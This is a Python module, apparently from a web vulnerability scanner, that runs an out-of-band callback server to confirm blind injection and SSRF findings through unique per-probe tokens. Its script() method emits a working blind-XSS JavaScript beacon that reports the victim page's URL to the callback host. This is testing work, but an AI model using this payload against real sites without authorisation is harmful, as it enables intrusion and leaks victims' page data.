"""SV1 - out of band callbacks.

A blind bug never answers on the page. Give it a host that listens. Every
probe carries a unique token, so a hit is tied to one injection and one time.
The first request proves the target reached us; the image request from the
returned script proves a browser executed it.
"""

from __future__ import annotations

import json
import re
import secrets
import threading
import time
import urllib.parse
from dataclasses import dataclass
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

from . import config

TOKEN_RE = re.compile(r"[a-f0-9]{16}\Z")
GIF = bytes.fromhex(
    "47494638396101000100800000ffffff00000021f90401000000002c"
    "00000000010001000002024401003b"
)


@dataclass
class Hit:
    token: str
    kind: str               # "script" | "exec"
    path: str
    query: str
    method: str
    remote: str
    user_agent: str
    referer: str
    at: float


@dataclass
class Probe:
    token: str
    label: str
    kind: str               # "blind" | "ssrf"
    at: float


def _clean(value: str, limit: int = 300) -> str:
    text = "".join(ch for ch in str(value) if ch >= " " and ch != "\x7f")
    return text[:limit]


def _route(path: str) -> tuple[str, str]:
    parts = [part for part in urllib.parse.urlsplit(path).path.split("/") if part]
    if len(parts) == 2 and parts[0] in ("t", "e") and TOKEN_RE.fullmatch(parts[1]):
        return parts[0], parts[1]
    return "", ""


class Callback:
    """One listener. Thread safe. Bounded. Stops when the scan stops."""

    def __init__(self, bind: str = "", base: str = "", wait: float = 0.0) -> None:
        raw = (bind or f"127.0.0.1:{config.OOB_PORT}").strip()
        if ":" in raw:
            host, port = raw.rsplit(":", 1)
        else:
            host, port = "127.0.0.1", raw
        self.host = host or "127.0.0.1"
        try:
            self.port = int(port)
        except ValueError:
            self.port = config.OOB_PORT
        self.base = (base or f"http://127.0.0.1:{self.port}").strip().rstrip("/")
        self.wait = max(1.0, float(wait or config.OOB_WAIT))
        self.error = ""
        self._server: ThreadingHTTPServer | None = None
        self._thread: threading.Thread | None = None
        self._lock = threading.Lock()
        self._hits: list[Hit] = []
        self._probes: dict[str, Probe] = {}

    # -- lifecycle ---------------------------------------------------------
    def start(self) -> bool:
        if not self.base.startswith(("http://", "https://")):
            self.error = "callback base must start with http:// or https://"
            return False
        callback = self

        class Handler(BaseHTTPRequestHandler):
            server_version = "sv1-oob"
            protocol_version = "HTTP/1.1"

            def log_message(self, fmt, *args) -> None:
                pass

            def _respond(self, body: bytes, content_type: str, status: int = 200) -> None:
                self.send_response(status)
                self.send_header("Content-Type", content_type)
                self.send_header("Content-Length", str(len(body)))
                self.send_header("Cache-Control", "no-store")
                self.send_header("Connection", "close")
                self.end_headers()
                self.close_connection = True
                try:
                    self.wfile.write(body)
                except Exception:
                    pass

            def do_GET(self) -> None:
                kind, token = callback.route(self.path)
                if kind == "t" and callback.registered(token):
                    callback.record(self, token, "script")
                    body = callback.script(token).encode("utf-8")
                    self._respond(body, "application/javascript; charset=utf-8")
                    return
                if kind == "e" and callback.registered(token):
                    callback.record(self, token, "exec")
                    self._respond(GIF, "image/gif")
                    return
                if not kind:
                    self._respond(b"sv1 oob", "text/plain")
                    return
                self._respond(b"not found", "text/plain", 404)

        try:
            self._server = ThreadingHTTPServer((self.host, self.port), Handler)
            self._server.daemon_threads = True
        except OSError as exc:
            reason = getattr(exc, "strerror", "") or str(exc)
            self.error = f"cannot bind {self.host}:{self.port} ({reason})"
            return False
        self._thread = threading.Thread(
            target=self._server.serve_forever,
            kwargs={"poll_interval": 0.05},
            daemon=True,
        )
        self._thread.start()
        return True

    def close(self) -> None:
        server = self._server
        self._server = None
        if server is not None:
            try:
                server.shutdown()
            except Exception:
                pass
            try:
                server.server_close()
            except Exception:
                pass
        thread = self._thread
        self._thread = None
        if thread is not None:
            thread.join(timeout=0.5)

    # -- probes ------------------------------------------------------------
    def register(self, label: str, kind: str) -> str:
        token = secrets.token_hex(8)
        with self._lock:
            self._probes[token] = Probe(token=token, label=_clean(label, 200),
                                        kind=kind, at=time.time())
        return token

    def registered(self, token: str) -> bool:
        with self._lock:
            return token in self._probes

    def url_for(self, token: str, kind: str = "t") -> str:
        return f"{self.base}/{kind}/{token}"

    def route(self, raw_path: str) -> tuple[str, str]:
        """Accept /t/<token> and a path based public base (/cb/t/<token>)."""
        path = urllib.parse.urlsplit(raw_path).path
        prefix = urllib.parse.urlsplit(self.base).path.rstrip("/")
        if prefix and (path == prefix or path.startswith(prefix + "/")):
            path = path[len(prefix):] or "/"
        return _route(path)

    # -- hits --------------------------------------------------------------
    def record(self, request, token: str, kind: str) -> None:
        parsed = urllib.parse.urlsplit(request.path)
        headers = request.headers
        forwarded = headers.get("X-Forwarded-For", "")
        remote = forwarded.split(",")[0].strip() if forwarded else request.client_address[0]
        hit = Hit(
            token=token,
            kind=kind,
            path=_clean(parsed.path, 200),
            query=_clean(parsed.query, 500),
            method=_clean(request.command, 10),
            remote=_clean(remote, 64),
            user_agent=_clean(headers.get("User-Agent", ""), 200),
            referer=_clean(headers.get("Referer", ""), 300),
            at=time.time(),
        )
        with self._lock:
            if len(self._hits) < config.OOB_MAX_HITS:
                self._hits.append(hit)

    def hits_for(self, token: str) -> list[Hit]:
        with self._lock:
            return [hit for hit in self._hits if hit.token == token]

    def _satisfied(self, token: str, need_exec: bool) -> bool:
        hits = self.hits_for(token)
        if not need_exec:
            return bool(hits)
        return any(hit.kind == "exec" for hit in hits)

    def settle(self, tokens: list[str], timeout: float, need_exec: bool = False) -> None:
        """Block until every token is satisfied, or the clock runs out."""
        wanted = [token for token in tokens if token]
        if not wanted:
            return
        deadline = time.monotonic() + max(0.0, float(timeout))
        while True:
            if all(self._satisfied(token, need_exec) for token in wanted):
                return
            if time.monotonic() >= deadline:
                return
            time.sleep(config.OOB_POLL)

    # -- payload -----------------------------------------------------------
    def script(self, token: str) -> str:
        """Runs on the victim page. The image hit is the execution proof."""
        endpoint = json.dumps(f"{self.base}/e/{token}")
        return (
            "(function(){try{var i=new Image();i.src="
            + endpoint
            + "+'?p='+encodeURIComponent(document.location.href)"
            + "+'&x='+Math.random();}catch(e){}})();"
        )
